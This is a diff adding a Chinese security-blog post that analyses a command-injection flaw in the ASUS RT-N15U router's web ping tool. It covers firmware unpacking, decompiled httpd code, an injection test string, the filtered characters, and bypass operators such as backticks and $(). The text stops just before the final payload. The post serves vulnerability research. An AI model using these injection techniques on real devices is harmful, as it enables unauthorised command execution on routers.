@@ -1,0 +1,730 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="GroundCtl2MajorTom">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="华硕 RT-N15U 命令执行漏洞分析路由器型号：RT-N15U			固件版本：3.0.0.4.376_3754 1，漏洞介绍​     由于前后端过滤不严，导致RT-N15U的NetworkTool菜单中的ping功能出现漏洞，通过绕过允许攻击者远程执行命令。 2，漏洞分析信息搜集包名：FW_RT_N15U_30043763754.trx binwalk分析 1binwalk -E FW_RT_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="华硕_RT-N15U_命令执行漏洞分析">
+<meta property="og:url" content="http://groundctl2majortom.github.io/2024/07/08/%E5%8D%8E%E7%A1%95-RT-N15U-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="GroundCtl2MajorTom">
+<meta property="og:description" content="华硕 RT-N15U 命令执行漏洞分析路由器型号：RT-N15U			固件版本：3.0.0.4.376_3754 1，漏洞介绍​     由于前后端过滤不严，导致RT-N15U的NetworkTool菜单中的ping功能出现漏洞，通过绕过允许攻击者远程执行命令。 2，漏洞分析信息搜集包名：FW_RT_N15U_30043763754.trx binwalk分析 1binwalk -E FW_RT_">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723214311192.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723213906829.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723215745609.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/08/%E5%8D%8E%E7%A1%95-RT-N15U-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723222140284.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/08/%E5%8D%8E%E7%A1%95-RT-N15U-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723222424160.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723213240939.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723221754496.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182121152.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182701926.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182635939.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182436610.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723183921456.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182957244.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723193722186.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/08/%E5%8D%8E%E7%A1%95-RT-N15U-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723190327660.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723194818278.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723194844617.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723212700603.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723221523818.png">
+<meta property="article:published_time" content="2024-07-08T06:27:13.000Z">
+<meta property="article:modified_time" content="2024-09-04T06:30:33.758Z">
+<meta property="article:author" content="GroundCtl2MajorTom">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723214311192.png">
+  
+  
+  
+  <title>华硕_RT-N15U_命令执行漏洞分析 - GroundCtl2MajorTom</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>GroundCtl2majorTom</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="华硕_RT-N15U_命令执行漏洞分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-08 14:27" pubdate>
+          2024年7月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">华硕_RT-N15U_命令执行漏洞分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="华硕-RT-N15U-命令执行漏洞分析"><a href="#华硕-RT-N15U-命令执行漏洞分析" class="headerlink" title="华硕 RT-N15U 命令执行漏洞分析"></a>华硕 RT-N15U 命令执行漏洞分析</h3><p><strong>路由器型号：RT-N15U			固件版本：3.0.0.4.376_3754</strong></p>
+<h4 id="1，漏洞介绍"><a href="#1，漏洞介绍" class="headerlink" title="1，漏洞介绍"></a>1，漏洞介绍</h4><p>​     由于前后端过滤不严，导致RT-N15U的NetworkTool菜单中的ping功能出现漏洞，通过绕过允许攻击者远程执行命令。</p>
+<h4 id="2，漏洞分析"><a href="#2，漏洞分析" class="headerlink" title="2，漏洞分析"></a>2，漏洞分析</h4><h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>包名：FW_RT_N15U_30043763754.trx</p>
+<p>binwalk分析</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">binwalk -E FW_RT_N15U_<span class="hljs-number">30043763754</span>.trx<br></code></pre></td></tr></table></figure>
+
+<p>binwalk解包</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">binwalk -Me FW_RT_N15U_<span class="hljs-number">30043763754</span>.trx<br></code></pre></td></tr></table></figure>
+
+<p>得到文件结构</p>
+<p>查看下目录，发现了几个不同于dlink的文件夹，但点进去都是空。查阅资料发现，jffs 文件夹是 ASUS 路由器固件中一个非常有用的持久性存储区域，主要用于用户自定义文件、第三方软件安装和其他持久性数据存储。</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723214311192.png" srcset="/img/loading.gif" lazyload alt="image-20240723214311192"></p>
+<p>通过修改过的firmwalker进行枚举，增加了一些信息泄露关键字</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">firmwalker$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> ./firmwalker_pro/firmwalker.sh ~/gujian/FW/_FW_RT_N15U_30043763754.trx.extracted/squashfs-root/ &gt; FW.txt</span><br></code></pre></td></tr></table></figure>
+
+<p>服务是httpd起的，启动项在rc二进制文件</p>
+<h6 id="httpd二进制文件"><a href="#httpd二进制文件" class="headerlink" title="httpd二进制文件"></a>httpd二进制文件</h6><p>file、checksec来一波、动态链接、mips小端</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723213906829.png" srcset="/img/loading.gif" lazyload alt="image-20240723213906829"></p>
+<h6 id="启动项rc二进制文件"><a href="#启动项rc二进制文件" class="headerlink" title="启动项rc二进制文件"></a>启动项rc二进制文件</h6><p>ida打开rc二进制文件</p>
+<p>这里着重关注httpd服务如何启用的，定位到sub_411C78()函数，这里调用了start_services函数</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723215745609.png" srcset="/img/loading.gif" lazyload alt="image-20240723215745609"></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs scss">int <span class="hljs-built_in">start_services</span>()<br>&#123;<br><span class="hljs-comment">//使用 cprintf 函数输出调试信息，格式为 &quot;start_services 3251&quot;，其中 3251 是一个整数参数。</span><br>  <span class="hljs-built_in">cprintf</span>(&quot;%s %d\n&quot;, &quot;start_services&quot;, <span class="hljs-number">3251</span>);<br><span class="hljs-comment">//启动一系列服务</span><br>  <span class="hljs-built_in">start_telnetd</span>();<br>  <span class="hljs-built_in">start_eapd</span>();<br>  <span class="hljs-built_in">start_nas</span>();<br>  <span class="hljs-built_in">start_wps</span>();<br>  <span class="hljs-built_in">start_wpsaide</span>();<br>  <span class="hljs-built_in">start_dnsmasq</span>();<br>  <span class="hljs-built_in">start_lan_port</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">start_httpd</span>();<br>  <span class="hljs-built_in">start_infosvr</span>();<br>  <span class="hljs-built_in">start_networkmap</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">restart_rstats</span>();<br>  <span class="hljs-built_in">start_watchdog</span>();<br>  <span class="hljs-built_in">start_lltd</span>();<br>  <span class="hljs-built_in">start_upnp</span>();<br>  <span class="hljs-built_in">start_pptpd</span>();<br><span class="hljs-comment">//使用 f_exists() 函数检查文件 &quot;/opt/etc/init.d/S50aicloud&quot; 是否存在，如果存在则调用 system() 函数执行 &quot;sh /opt/etc/init.d/S50aicloud scan&quot; 命令。</span><br>  if ( f_exists(&quot;/opt/etc/init.d/S50aicloud&quot;) )<br>    <span class="hljs-built_in">system</span>(&quot;sh /opt/etc/init.d/S50aicloud scan&quot;);<br>  return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>进入start_httpd()分析</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> start_httpd()<br>&#123;<br><span class="hljs-regexp">//</span>初始化<br>  char *<span class="hljs-number">v1</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$a0</span><br>  <span class="hljs-keyword">int</span> productid; <span class="hljs-regexp">//</span> <span class="hljs-variable">$v0</span><br>  char <span class="hljs-number">v3</span>[<span class="hljs-number">4</span>]; <span class="hljs-regexp">//</span> [sp+18h] [-10h] BYREF<br>  <span class="hljs-keyword">int</span> <span class="hljs-number">v4</span>[<span class="hljs-number">3</span>]; <span class="hljs-regexp">//</span> [sp+1Ch] [-Ch] BYREF<br>//这里初始化了一个整数数组 <span class="hljs-number">v4</span>，其中 <span class="hljs-number">v4</span>[<span class="hljs-number">1</span>] 被设置为 dword_4AF4A0 的值，<span class="hljs-number">v4</span>[<span class="hljs-number">0</span>] 被设置为字符串常量 <span class="hljs-string">&quot;httpd&quot;</span> 的地址。<br>  <span class="hljs-number">v4</span>[<span class="hljs-number">1</span>] = dword_4AF4A0;<br>  <span class="hljs-number">v4</span>[<span class="hljs-number">0</span>] = (<span class="hljs-keyword">int</span>)<span class="hljs-string">&quot;httpd&quot;</span>;<br><span class="hljs-regexp">//</span>条件检查，getpid() 函数返回当前进程的进程 ID。如果当前进程的 ID 不等于 <span class="hljs-number">1</span>，那么调用 notify_rc 函数，并传入 <span class="hljs-string">&quot;start_httpd&quot;</span> 作为参数，然后返回其结果。<br>  <span class="hljs-keyword">if</span> ( getpid() != <span class="hljs-number">1</span> )<br>    <span class="hljs-keyword">return</span> ((<span class="hljs-keyword">int</span> (__fastcall *)(const char *))notify_rc)(<span class="hljs-string">&quot;start_httpd&quot;</span>);<br><span class="hljs-regexp">//</span>获取配置信息，使用 nvram_get(<span class="hljs-string">&quot;httpd_dir&quot;</span>) 获取名为 <span class="hljs-string">&quot;httpd_dir&quot;</span> 的配置信息。如果获取失败（返回空指针），将 <span class="hljs-number">v1</span> 设置为空字符串；如果 <span class="hljs-number">v1</span> 为空字符串，将其设为 <span class="hljs-string">&quot;/www&quot;</span>。<br>  <span class="hljs-number">v1</span> = (char *)nvram_get(<span class="hljs-string">&quot;httpd_dir&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v1</span> )<br>    <span class="hljs-number">v1</span> = <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-keyword">if</span> ( !*<span class="hljs-number">v1</span> )<br>    <span class="hljs-number">v1</span> = <span class="hljs-string">&quot;/www&quot;</span>;<br><span class="hljs-regexp">//</span>将当前工作目录更改为 <span class="hljs-number">v1</span> 所指向的目录。<br>  <span class="hljs-keyword">chdir</span>(<span class="hljs-number">v1</span>);<br><span class="hljs-regexp">//</span>检查http服务器启用状态，使用 nvram_get_int(<span class="hljs-string">&quot;http_enable&quot;</span>) 获取名为 <span class="hljs-string">&quot;http_enable&quot;</span> 的配置信息的整数值。如果其不等于 <span class="hljs-number">1</span>，则执行 <span class="hljs-keyword">eval</span>(<span class="hljs-number">v4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">v3</span>)，获取产品 ID 并记录一条正常日志消息以启动 HTTP 服务器。<br>  <span class="hljs-keyword">if</span> ( nvram_get_int(<span class="hljs-string">&quot;http_enable&quot;</span>) != <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-number">v4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">v3</span>);<br>    productid = get_productid();<br>    logmessage_normal(productid, <span class="hljs-string">&quot;start httpd&quot;</span>);<br>  &#125;<br>//将当前工作目录切换回操作系统的根目录 /。<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h6 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h6><p>这里用到了ida的VulFi插件</p>
+<img src="image-20240723222140284.png" srcset="/img/loading.gif" lazyload alt="image-20240723222140284" style="zoom:67%;" />
+
+<p>搜集到这里的system危险函数就是我们今天的漏洞点</p>
+<img src="image-20240723222424160.png" srcset="/img/loading.gif" lazyload alt="image-20240723222424160" style="zoom: 50%;" />
+
+<h5 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h5><p>使用FirmAE模拟，非常方便</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723213240939.png" srcset="/img/loading.gif" lazyload alt="image-20240723213240939"></p>
+<p>这里FirmAE模拟起来以后连不上shell，但web界面里可以开启telnet</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723221754496.png" srcset="/img/loading.gif" lazyload alt="image-20240723221754496"></p>
+<p>PS：都可以直接开启telnet了为什么还要进web页面命令执行？因为有的内网防火墙即使开启telnet，23端口也无法出网</p>
+<p>漏洞点在NetworkTools下的ping命令中</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.1.1/Main_Analysis_Content.asp</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182121152.png" srcset="/img/loading.gif" lazyload alt="image-20240723182121152"></p>
+<p>常规操作先输入127.0.0.1|echo 1&gt; &#x2F;tmp&#x2F;aaa</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182701926.png" srcset="/img/loading.gif" lazyload alt="image-20240723182701926"></p>
+<p>burp抓包</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182635939.png" srcset="/img/loading.gif" lazyload alt="image-20240723182635939"></p>
+<p>进入telnet查看&#x2F;tmp目录发现注入并未成功</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182436610.png" srcset="/img/loading.gif" lazyload alt="image-20240723182436610"></p>
+<p>命令连接符尝试||、|、&amp;、&amp;&amp;、分号均无果</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">| cmd2 只执行cmd2</span><br>cmd1 <span class="hljs-string">|| cmd2 只有当cmd1执行失败后，cmd2才被执行</span><br>cmd1 <span class="hljs-meta">&amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2</span><br>cmd1 <span class="hljs-meta">&amp;&amp; cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2</span><br></code></pre></td></tr></table></figure>
+
+<p>查看asp页面源代码</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723183921456.png" srcset="/img/loading.gif" lazyload alt="image-20240723183921456"></p>
+<p>可以看到document.form.destIP.value是我们输入框中输入的内容，当payload输入时，与ping -c $count 拼接成SystemCmd参数传入apply.cgi，然后进入httpd中进行进一步操作</p>
+<p>IDA分析二进制文件httpd</p>
+<p>搜索字符串traceroute定位到sub_41F360()函数</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723182957244.png" srcset="/img/loading.gif" lazyload alt="image-20240723182957244"></p>
+<p>查看伪代码</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723193722186.png" srcset="/img/loading.gif" lazyload alt="image-20240723193722186"></p>
+<p>get_cgi中接收SystemCmd的值</p>
+<p>并且过滤掉了<code>&amp;、;、%、|、\n、\r</code>，怪不得一开始注入不成功</p>
+<p>判断是哪个asp页面，判断输入的命令，进入sys_script函数进一步拼接系统要执行的命令并将其执行</p>
+<p>sys_script函数</p>
+<img src="image-20240723190327660.png" srcset="/img/loading.gif" lazyload alt="image-20240723190327660" style="zoom:50%;" />
+
+<p>所以猜测，在web中用ping工具ping某ip，最后在系统中拼接执行的命令应该是</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">sh -c <span class="hljs-built_in">ping</span> -c $ip_count $ip &gt; /tmp/syscmd.<span class="hljs-built_in">log</span><br>//-c 是一个选项，告诉 Shell 后面的参数是一个命令字符串。<br></code></pre></td></tr></table></figure>
+
+
+
+<p>这时插入<code>&amp;、;、%、|、\n、\r</code>以外的命令注入绕过payload  (可以是反引号或者$符)</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">linux下一些常见绕过方式&amp;&amp;、||、；、$()、··（反引号TAB上面的那个键）、%0a、%0d<br>参考文章：https:<span class="hljs-comment">//blog.csdn.net/L2329794714/article/details/123561984</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>payload:</p>
